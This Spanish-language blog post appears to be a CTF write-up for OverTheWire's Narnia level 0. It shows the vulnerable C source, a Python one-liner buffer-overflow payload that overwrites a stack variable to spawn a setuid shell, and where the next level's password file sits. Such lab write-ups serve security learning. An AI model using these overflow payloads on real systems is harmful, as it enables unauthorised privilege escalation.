---
layout: default
---

## OvertheWire: Narnia0
![Narnia](../../assets/images/Narnia0.png)
`1-04-2021 3:15PM`
Hola a todos!

En los siguientes post les dejaré mi write up sobre los 4 primeros desafíos del reto [Narnia](https://overthewire.org/wargames/narnia/) de la plataforma OverTheWire

Bien, cada rato cuenta con un binario SetUID y el código fuente en C (he dejado el código fuente de los binarios abajo), por lo que podemos tener una idea de como se compone el desafío

Para resolver los desafíos hay que comprender cómo funciona el stack y los conceptos de [Buffers Overflows](../Exploiting/post1.html)

### Empezando(Desafío 0)

Lo primero que haremos será conectarnos a la máquina remota mediante SSH con las credenciales que nos brinda la misma página:
```
user: narnia0   
pass: narnia0
puerto: 2226
```
`ssh narnia0@narnia.labs.overthewire.org -p 2226`

Ahora nos dirigimos al directorio /narnia/ y buscamos el código fuente y el binario, aquí está el código fuente:

```c
#include <stdio.h>
#include <stdlib.h>

int main(){
    long val=0x41414141;  /*Puts the value we want to overwrite on the stack*/
    char buf[20];         /*Sets the buffer length to 20 bytes*/

    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
    printf("Here is your chance: ");
    scanf("%24s",&buf); /*Reads input into buffer (24 char limit on buffer, which is enough to fill the buffer and then the 4 bytes for deadbeef)*/

    printf("buf: %s\n",buf); /*Prints contents of buffer*/
    printf("val: 0x%08x\n",val); /*Outputs value we want to overwrite*/

    if(val==0xdeadbeef){ /*If value == 0xdeadbeef*/
        setreuid(geteuid(),geteuid()); /*Make the binary use the SUID and GUID*/
        system("/bin/sh"); /*Run /bin/sh to spawn a shell*/
    }
    else { /*If the value isn't 0xdeadbeef then*/
        printf("WAY OFF!!!!\n"); /*Print "WAY OFF!!!!" and then exit*/
        exit(1);
    }

    return 0;
}
```

Analizando el código nos damos cuenta que el binario cuenta con un buffer de tamaño 20, y teniendo en cuenta que no tiene límites sobre la cantidad de caracteres que se pueden escribir en el buffer, nos permite escribir más de 20 caracteres en la memoria y teniendo en cuenta que la variable "val" es el siguiente valor en la pila, podemos sobreescribir su contenido, entonces estamos en presencia de un Buffer Overflow

Podemos hacer esto de dos maneras, la manera limpia y la manera repugnante:

La forma limpia sería hacer que Python imprima veinte A (el tamaño del buffer), más el valor que queremos poner en la memoria, que en este caso debe estar en formato [little endian](https://es.m.wikipedia.org/wiki/Endianness)

Sabemos que debe ser un formato little endian, ya que cuando ejecutamos "file/narnia/narnia0", obtenemos el siguiente resultado:

`narnia0: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=0840ec7ce39e76ebcecabacb3dffb455cfa401e9, not stripped`

Para convertir un valor a little endian (en este caso queremos convertir `0xdeadbeef`), entonces eliminamos el 0x (esto es solo un indicador de que el valor es hexadecimal), luego lo dividimos en grupos de dos (de ad be ef ), ahora invertimos el orden de los grupos, pero no los caracteres (ef be ad de), y finalmente agregamos "\x" delante de cada grupo, y los ponemos todos juntos: `\xef\xbe\xad\xde` así que eso es lo que necesitamos alimentar el binario después de los 20 bytes, probémoslo.
```
narnia0@narnia:/narnia$ python -c 'print "A"*20 + "\xef\xbe\xad\xde"' | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAA
                                               val: 0xdeadbeef
```

Entonces, el desafío falla y no abre un shell, pero nos muestra que el valor correcto está en su lugar, ahora podemos usar un pequeño truco que involucra a `cat` para mantener abierto el flujo de E/S:

```
narnia0@narnia:/narnia$ (python -c 'print "A"*20 + "\xef\xbe\xad\xde"';cat) | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAA
                                               val: 0xdeadbeef
whoami
narnia1
```

Y listo, así obtenemos una shell como el usuario narnia1, buscamos la pass en el directorio etc/narnia_pass/narnia1 y ya podemos logueranos como este usuario

En el siguiente post hablaré sobre el siguiente desafío
